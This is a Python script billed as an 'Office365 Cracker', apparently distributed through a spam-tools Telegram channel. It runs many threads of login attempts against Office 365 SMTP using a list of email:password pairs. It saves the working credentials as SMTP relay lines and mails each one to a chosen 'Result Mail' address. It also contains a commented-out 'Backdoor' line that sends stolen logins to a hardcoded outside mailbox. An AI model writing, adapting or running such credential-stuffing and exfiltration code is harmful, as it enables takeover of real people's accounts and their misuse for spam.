import smtplib
from smtplib import SMTPAuthenticationError, SMTPDataError
import threading
import time
from colorama import Fore
import os
os.system('cls')
MAIL_TO_SEND = ''

def Validate(combo):
    Combo = combo.split(':')
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.ehlo()
    server.starttls()
    username = Combo[0].strip()
    password = Combo[1].strip()
    try:
        server.login(username, password)
        print(Fore.GREEN + 'Valid Login - ' + combo)
        output = 'valid-office365.txt'
        with open(output, 'a') as f:
            f.write(combo + '\n')
        oo = combo.replace(':', '|')
        out = f'''smtp.office365.com|587|{oo}'''
        
        with open('SMTP-office365.txt', 'a') as f:
            f.write(out + '\n')
        message = 'Subject: {}\n\n{}'.format(combo, combo)
        # Backdoor from @donussef
        #server.sendmail(username, 'ya22@gcloud.ua.es', message)
        server.sendmail(username, MAIL_TO_SEND, message)
        return None
    except SMTPAuthenticationError:
        print(Fore.RED + 'Invalid Login - ' + combo)
    except SMTPDataError:
        print(Fore.RED + 'Invalid Login - ' + combo)
    except Exception:
        print(Fore.RED + 'Failed - ' + combo)
    finally:
        server.quit()


def Blacklist(comb):
    blacklist = open('BlackList.txt', 'r').read()
    domain = comb.split(':')[0].split('@')[1].strip()
    if domain in blacklist:
        print(Fore.YELLOW + 'BackListed ! ', comb)
        return None
    Validate(comb)

def blacklist(comb):
    with open('BlackList.txt', 'r') as f:
        blacklist = f.read()
    domain = comb.split(':')[0].split('@')[1].strip()
    if domain in blacklist:
        print(Fore.YELLOW + 'BackListed ! ' + comb)
    else:
        Validate(comb)

def main():
    os.system('cls')
    banner = (
        "\n\n    ____  ____  _   ____  ____________ ____________\n"
        "   / __ \\/ __ \\/ | / / / / / ___/ ___// ____/ ____/\n"
        "  / / / / / / /  |/ / / / /\\__ \\__ \\/ __/ / /_    \n"
        " / /_/ / /_/ / /|  / /_/ /___/ /__/ / /___/ __/    \n"
        "/_____/\\____/_/ |_/\\____//____/____/_____/_/       \n"
        "                                               \n"
    )
    print(Fore.LIGHTGREEN_EX + banner + 
          "\n             Office365 Cracker\n"
          "             Community  https://t.me/freespamtools2\n"
          "              Coded By @donussef\n"
    )
    file = input(Fore.RED + '[+] ComboList: ')
    Thread_user = int(input(Fore.LIGHTGREEN_EX + '[+] Threads :'))
    MAIL_TO_SEND = input(Fore.LIGHTBLUE_EX + '[+] Result Mail: ')
    th = []
    with open(file, 'r', encoding='utf-8', errors='ignore') as read:
        Read = read.readlines()
    for combolist in Read:
        while threading.active_count() > Thread_user:
            time.sleep(0.1)
        thread = threading.Thread(target=Blacklist, args=(combolist,))
        thread.start()
        th.append(thread)
    for ths in th:
        ths.join()
 
if __name__ == "__main__":
    main()